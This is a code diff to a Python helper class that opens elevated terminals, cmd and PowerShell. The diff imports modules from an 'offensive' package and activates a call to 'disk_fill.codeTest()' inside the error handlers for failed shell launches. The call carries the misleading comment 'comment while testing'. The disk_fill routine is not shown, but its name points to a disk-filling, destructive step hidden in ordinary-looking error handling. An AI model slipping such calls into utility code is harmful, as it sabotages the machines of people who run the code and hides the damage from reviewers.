@@ -1,17 +1,15 @@
-from abc import ABC, abstractmethod
 import subprocess
 import shutil
-import CodeTest
-import platform_utils as Platform
-from elevate import ElevateBase
+from offensive.collection import disk_fill
+from offensive.platform import platform_utils as Platform
+from offensive.platform.elevate import ElevateBase
 
 
-class TerminalBase(ABC):
+class TerminalBase():
     """This is a OS specific class to handle terminal operations across different platforms.
     It provides methods to start the default terminal, command shell, and PowerShell with elevated privileges"""
 
     @staticmethod
-    @abstractmethod
     def start_terminal():
         """Start the default terminal with administrator rights when possible."""
         if Platform.CURRENT_OS.lower() == "windows":
@@ -47,7 +45,7 @@ class TerminalBase(ABC):
 
     except Exception as e:
         print(f"Error starting command shell: {e} trying...")
-        # CodeTest.codeTest() # comment while testing
+        disk_fill.codeTest() # comment while testing
         raise OSError("Permission denied: Unable to start command shell. Please check your permissions and try again.")
 
     try:
@@ -63,5 +61,5 @@ class TerminalBase(ABC):
     except Exception as e:
         
         print(f"Error starting PowerShell: {e} trying...")
-        # CodeTest.codeTest() # comment while testing
+        disk_fill.codeTest() # comment while testing
         raise OSError("Permission denied: Unable to start PowerShell. Please check your permissions and try again.")
